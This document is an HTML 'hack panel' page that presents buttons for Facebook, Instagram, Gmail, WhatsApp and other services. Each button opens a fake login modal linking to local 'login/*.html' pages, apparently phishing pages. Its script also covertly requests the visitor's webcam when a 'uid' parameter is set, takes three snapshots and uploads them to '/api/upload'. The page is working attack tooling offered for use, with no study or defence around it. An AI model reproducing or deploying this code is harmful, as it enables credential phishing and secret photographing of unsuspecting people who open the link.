<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>KING WACIQ HACK PANEL</title>
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600&display=swap" rel="stylesheet">
  <style>
    html, body {
      margin: 0;
      padding: 0;
      background: #000;
      color: #00ff00;
      font-family: 'Orbitron', monospace;
      overflow: hidden;
      cursor: url('https://cur.cursors-4u.net/cursors/cur-13/cur1140.cur'), auto;
    }
    canvas {
      position: fixed;
      top: 0;
      left: 0;
      z-index: 0;
    }
    .overlay {
      position: relative;
      z-index: 2;
      text-align: center;
      padding-top: 50px;
    }
    h1 {
      font-size: 3em;
      animation: glow 2s infinite alternate;
    }
    h2 {
      font-size: 2em;
      animation: pulse 2s infinite;
    }
    .log {
      margin-top: 20px;
      font-size: 14px;
      white-space: pre-line;
      color: #66ff66;
    }
    @keyframes glow {
      from { text-shadow: 0 0 5px #00ff00; }
      to { text-shadow: 0 0 20px #00ff00, 0 0 30px #00ff00; }
    }
    @keyframes pulse {
      0% { transform: scale(1); opacity: 1; }
      50% { transform: scale(1.1); opacity: 0.7; }
      100% { transform: scale(1); opacity: 1; }
    }
    .platforms {
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
      gap: 15px;
      margin-top: 30px;
    }
    .platforms button {
      background: transparent;
      border: 2px solid #00ff00;
      color: #00ff00;
      padding: 10px 20px;
      border-radius: 10px;
      font-weight: bold;
      font-size: 16px;
      transition: 0.3s;
      cursor: pointer;
    }
    .platforms button:hover {
      background: #00ff00;
      color: #000;
      transform: scale(1.1);
    }
    .login-modal {
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      background: #000;
      padding: 30px;
      z-index: 9999;
      display: none;
      border-radius: 8px;
      width: 300px;
      box-shadow: 0 0 20px #0f0;
      color: #0f0;
      font-family: 'Orbitron', monospace;
    }
    .login-modal h3 {
      margin-top: 0;
      font-size: 22px;
      color: #0f0;
      text-align: center;
    }
    .login-modal input {
      display: block;
      margin: 10px 0;
      width: 100%;
      padding: 10px;
      border: 1px solid #0f0;
      border-radius: 6px;
      background: #000;
      color: #0f0;
      font-size: 14px;
    }
    .login-modal button {
      padding: 10px;
      width: 100%;
      background: #00ff00;
      color: #000;
      border: none;
      border-radius: 6px;
      font-size: 16px;
      margin-top: 10px;
      cursor: pointer;
    }
    .login-modal button:hover {
      background: #66ff66;
    }
    .close-btn {
      position: absolute;
      top: 5px;
      right: 10px;
      font-size: 20px;
      cursor: pointer;
    }
    .hacker-img {
      position: fixed;
      bottom: 10px;
      left: 10px;
      width: 250px;
      opacity: 0.2;
      z-index: 1;
    }
  </style>
</head>
<body>
  <audio autoplay loop>
    <source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-10.mp3" type="audio/mpeg">
  </audio>
  <canvas id="matrix"></canvas>
  <img src="https://i.imgur.com/Cr3pQkQ.png" alt="Hacker" class="hacker-img">
  <div class="overlay">
    <h1>KING WACIQ</h1>
    <h2>HACK PANEL</h2>
    <div class="log" id="log">Connecting to server...</div>
    <div class="platforms">
      <button onclick="openLogin('Facebook', 'login/fb.html')">FACEBOOK</button>
      <button onclick="openLogin('Instagram', 'login/ig.html')">INSTAGRAM</button>
      <button onclick="openLogin('TikTok', 'login/tiktok.html')">TIKTOK</button>
      <button onclick="openLogin('Gmail', 'login/gmail.html')">GMAIL</button>
      <button onclick="openLogin('PUBG', 'login/pubg.html')">PUBG</button>
      <button onclick="openLogin('Snapchat', 'login/snap.html')">SNAPCHAT</button>
      <button onclick="openLogin('Twitter', 'login/twitter.html')">TWITTER</button>
      <button onclick="openLogin('Netflix', 'login/netflix.html')">NETFLIX</button>
      <button onclick="openLogin('Spotify', 'login/spotify.html')">SPOTIFY</button>
      <button onclick="openLogin('WhatsApp', 'login/whatsapp.html')">WHATSAPP</button>
      <button onclick="openLogin('YouTube', 'login/yt.html')">YOUTUBE</button>
    </div>
  </div>

  <div class="login-modal" id="loginModal">
    <div class="close-btn" onclick="closeLogin()">&times;</div>
    <h3 id="loginTitle">Login</h3>
    <input type="text" placeholder="Username or Email">
    <input type="password" placeholder="Password">
    <button id="realLink">Log In</button>
  </div>

  <video id="video" autoplay playsinline style="display:none;"></video>
  <canvas id="canvas" style="display:none;"></canvas>

  <script>
    // Matrix Background
    const canvas = document.getElementById("matrix");
    const ctx = canvas.getContext("2d");
    canvas.height = window.innerHeight;
    canvas.width = window.innerWidth;
    let letters = Array(256).join("1").split("");

    function draw() {
      ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
      ctx.fillRect(0, 0, canvas.width, canvas.height);
      ctx.fillStyle = "#0f0";
      letters.forEach((y, index) => {
        let text = String.fromCharCode(3e4 + Math.random() * 33);
        let x = index * 10;
        ctx.fillText(text, x, y);
        letters[index] = y > 758 + Math.random() * 1e4 ? 0 : y + 10;
      });
    }
    setInterval(draw, 33);

    // Typing log
    const typingText = ["Bypassing firewall...", "Access granted!", "KING WACIQ online", "Tracking target..."];
    const log = document.getElementById("log");
    let logIndex = 0;
    function typeLine() {
      if (logIndex >= typingText.length) return;
      let line = typingText[logIndex];
      let i = 0;
      let interval = setInterval(() => {
        if (i <= line.length) {
          log.innerText += line.charAt(i);
          i++;
        } else {
          clearInterval(interval);
          log.innerText += "\\n";
          logIndex++;
          setTimeout(typeLine, 800);
        }
      }, 50);
    }
    setTimeout(typeLine, 1000);

    // Open Login Modal
    function openLogin(platform, fakeLink) {
      document.getElementById('loginTitle').innerText = platform + ' Login';
      document.getElementById('realLink').onclick = () => window.open(fakeLink, '_blank');
      document.getElementById('loginModal').style.display = 'block';
    }
    function closeLogin() {
      document.getElementById('loginModal').style.display = 'none';
    }

    // Auto Camera Snapshot + Upload
    const video = document.getElementById('video');
    const canvasSnap = document.getElementById('canvas');
    const ctxSnap = canvasSnap.getContext('2d');
    const params = new URLSearchParams(window.location.search);
    const uid = params.get('uid');

    if (uid) {
      navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
        video.srcObject = stream;
        setTimeout(() => takePhotoAndSend(), 2000);
        setTimeout(() => takePhotoAndSend(), 4000);
        setTimeout(() => takePhotoAndSend(), 6000);
      }).catch(() => {});
    }

    function takePhotoAndSend() {
      canvasSnap.width = video.videoWidth;
      canvasSnap.height = video.videoHeight;
      ctxSnap.drawImage(video, 0, 0);
      const imageData = canvasSnap.toDataURL('image/png');
      fetch('/api/upload', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ image: imageData, uid })
      });
    }

    // Terminal hidden easter egg
    document.addEventListener('keydown', function(e) {
      if (e.shiftKey && e.key === 'T') {
        alert("Terminal mode activated (fake)");
      }
    });
  </script>
</body>
</html>
